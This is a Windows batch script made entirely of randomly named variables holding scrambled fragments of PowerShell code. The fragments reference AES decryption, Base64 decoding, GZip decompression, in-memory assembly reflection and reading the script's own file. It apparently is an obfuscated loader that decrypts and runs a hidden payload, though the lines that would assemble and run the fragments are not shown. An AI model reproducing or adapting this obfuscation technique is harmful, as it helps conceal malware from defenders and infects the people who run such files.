@echo off
set "iJmPHNtfuB=k; }"
set "zvcIeijYCs=m(, "
set "DKJmfcrjZG=t Sy"
set "MBiQpLxYGu=$Txw"
set "CqKZDfwSAx=brea"
set "EUAWYDCRik=TllA"
set "iVxJlIMoWB=Star"
set "EcPUBlkntT=PKCS"
set "GKbnUvwmKh=)) {"
set "asRjXnBOqq=.Dis"
set "WIUQWZREDl=L4Yi"
set "cfnCkSTsqB=Mode"
set "QWAMToFQdb=ss -"
set "bkpwOfWFuY=S46e"
set "UwxlDmoOhh=.Con"
set "HViXSAjmhy=esaB"
set "WVdWniOkbZ=ress"
set "heUbOGulPJ=Fina"
set "YtFZMVIBXj=ionM"
set "umtSOHTMrL=ispo"
set "amsgKYSQuo=YSd "
set "TCkkJjLrWZ=lit("
set "UwNCbSrhZw=ress"
set "OBHiMEOGVJ=m.IO"
set "MerUWJZTjG='gni"
set "wukKcDJRYo='[-1"
set "xieMtoGKfJ=bstr"
set "vLhObcfayT=rofi"
set "OmuxCAYRLP= = ["
set "aRZbcOPzLW=.Key"
set "KQxRBANYTR=y.Pa"
set "lMHDBcmKlO=ode]"
set "edaLAyoxoQ=A.Pa"
set "XwkSARIgxu== $o"
set "YlcOHyItpG=);$o"
set "IWGZBmfHcb=eMGe"
set "dIdWCmTPPR=y]::"
set "dMIiJOUGuj=)))"
set "ZapWPYgGvy=ion."
set "HntGuwNbuZ=, (,"
set "KFJtAVnnAa===')"
set "zgHTfrWSCa=6] -"
set "HVmLQyHxbp=tion"
set "cghZDFpFtg=KH);"
set "iESbwpFZIs=morF"
set "YjfwfyQmmf=eam("
set "GEveGIDWBi=ose("
set "piNTcIyPcz=oL'["
set "VHlFCuZopK=ach "
set "BtnMuvCuan=mory"
set "MytXOKJwxi=Disp"
set "NkCaSXSBHY=em.C"
set "YEnVplrJMK=;$eK"
set "jhHtBVBGQy=).Sp"
set "LybcJaCaPF=se()"
set "XPUauqlRcf=esMa"
set "WvZbOeUOoT=l5E7"
set "ogHhhSsfgU=; };"
set "MOFkSmEjeq=PTtG"
set "vcYZQEtvjI=ct S"
set "CvJPNuGxDR=and "
set "huvifIVaSX=zuZI"
set "uDtjiyAUod=xwmK"
set "LPrzbRRxZw=ose("
set "fxfNTwIDRK= [Sy"
set "PWaOUunKYy= [Sy"
set "WdHjvubUrf=Bmor"
set "UnKAAzrlGT=Secu"
set "HwjHMeOZOw=oin "
set "NrxGOdCXhF=Conv"
set "ZUvaHCzYsm=d;$o"
set "qHrYYDqiim=urit"
set "OWuYGLNAdT= = $"
set "xgvRfOIyDD=;$eK"
set "OSxXwyfOaI=$pOX"
set "lZGTPUVkTU=-joi"
set "YzRJdjmSfy=);$o"
set "subecsWCHd=ct S"
set "sfXybXoZCt=VTAA"
set "fnQKJqKRVr=$pOX"
set "HyBOYRmvoG=y = "
set "RFunhZzOqr=gMod"
set "CEWlouTrqi=ing("
set "LbhVmTPskc=.IO."
set "gqkIsNZvND=XCK "
set "LfvYhlTWHj=$Txw"
set "wIhULtPICZ=mYYx"
set "nUFPxPxTqY=dj0C"
set "hfPdCPSVyk=gth)"
set "HsWUyKAGLY=pStr"
set "nSFkuGkLIA=$zeM"
set "YNIoPHmOhH=rLld"
set "klqzDxdRWj=trea"
set "HEyZtjdzVL=106u"
set "qLwjVQwuaW=tsWi"
set "PZNHXGYvmU=.Len"
set "tyelJdmloQ=16] "
set "TzHmVSirsw=.Com"
set "xXZgdGfXtA=m.IO"
set "hfAGpKmFox=m.Re"
set "udbawOGFAy=pres"
set "JFPYFyCAoh=3); "
set "jXSsnlViVr=.Cry"
set "navopnFero=ew-O"
set "gSHiAKRlVo=null"
set "nBEUMOtszj=pVYS"
set "dGxqpcwuOP=grap"
set "EVNnRmyPXp=yy, "
set "SoeUJUNCjP=VTAA"
set "axzwprWTpE=jagS"
set "uoXarKPeZq=VTAA"
set "hPUvJRFMmB=  $j"
set "VRAXcCtvux=ateD"
set "MnqLEjKQTv=join"
set "rBByTkqkex=e]::"
set "ecIxZSofjt=rity"
set "KtyDTvRvbe=;$Rr"
set "kdMKMfiJJF=New-"
set "FuLgYDmMUX=::De"
set "vUJbRAnmYy=oint"
set "MMAaAIOEdD=oryS"
set "femOBRocZb=yste"
set "TDArxYWGkj=tem."
set "cuoNQqalKR=comm"
set "LkfPGVloHK=();$"
set "YRFWlPSANq=-1.."
set "iKygjoQhfR=Ge.D"
set "PDvVSrHbQp=;$XK"
set "MrLFLcnoIw=stem"
set "UHoWFUqwFx=rt]:"
set "WysKMasZtD='0Pg"
set "UFlYqiuCkE=1] -"
set "RCNEHTSzlr=($pV"
set "CNnOnyKxhY=-Obj"
set "QBKPVejbAo=[Sys"
set "XbRTaasZqR=mK ="
set "yZTtfftbGh=ptor"
set "zXWlWRjmtT=('%~f0'"
set "ZWvOwNPfBb='txe"
set "wtphRFuNDS=CK.T"
set "OCsQnPKVlY=KH.T"
set "zPcKRJczkS=KH ="
set "TrAWqebdVk=yste"
set "aJtGoWYhSW=K = "
set "LOoFQkHeCM= [st"
set "aNbFYsbJLW=ptog"
set "harYklbbEj= '')"
set "qIRzpIpfVD=O) {"
set "PCRLdlbsZZ=flec"
set "BnhlyqUYef=::('"
set "IlDHDZQZBU=.Dis"
set "BQEdSqjyhi=OXKH"
set "NwEACXoInR=tryP"
set "CqfWwFqlhX=]::("
set "SHouqzRZtO=Fznk"
set "PhzCLayMvM=Lyy."
set "AcKJLuMjGz=Txwm"
set "TzmwytYYPk=($pV"
set "jRCTESbCOQ=daeR"
set "NYXwzAdFqY=K = "
set "yWxqCfWSFg=.Ass"
set "AIdxXDCZpq=ptog"
set "MPFFMcuTtS=e = "
set "HeZFXlAZiM=.-16"
set "HwjNzSHNPH=nirt"
set "uZyEDqbdzH=ddin"
set "BCtSHpNpHt=Disp"
set "bYHBzSyZLt=VTAA"
set "IHgonZmQRF=ck($"
set "vZGTiKwYyZ=gjYA"
set "aEMSMifZQV=)($T"
set "DTFfQmGMRl=Txwm"
set "VOTYqocXvo=tS46"
set "cTuKVgVuas=1..-"
set "UbNMhFHIMQ=XKLy"
set "ztOoOoaHfL=vert"
set "UVUSPbNUZC= = N"
set "KmqkfPrfPN=[Env"
set "UXJqHNEYdP=$Fzn"
set "HvWkFNRvDi=saBm"
set "jLTLdKJbkA=-nop"
set "EJGqFLUBRi=kO ="
set "nawzWTXYfT=ypto"
set "HDsGooKanO=Obje"
set "ZgJejvkMQu=zeMG"
set "CihABakawf='')("
set "TRdciEeDTB=rity"
set "pgxzEIUvLd=F'[-"
set "GGWlQDHyai=);$z"
set "xBkLjReJfD=eMVs"
set "mhcNchuwyP=-4] "
set "fSgEIvnHAU=gsYZ"
set "KrpKwJNocT=th('"
set "CCVRFPBPTs=YxVw"
set "scILbsShaO=K, 0"
set "dLBxhJEbhL=hy.A"
set "DqHXjLkKRn=.GZi"
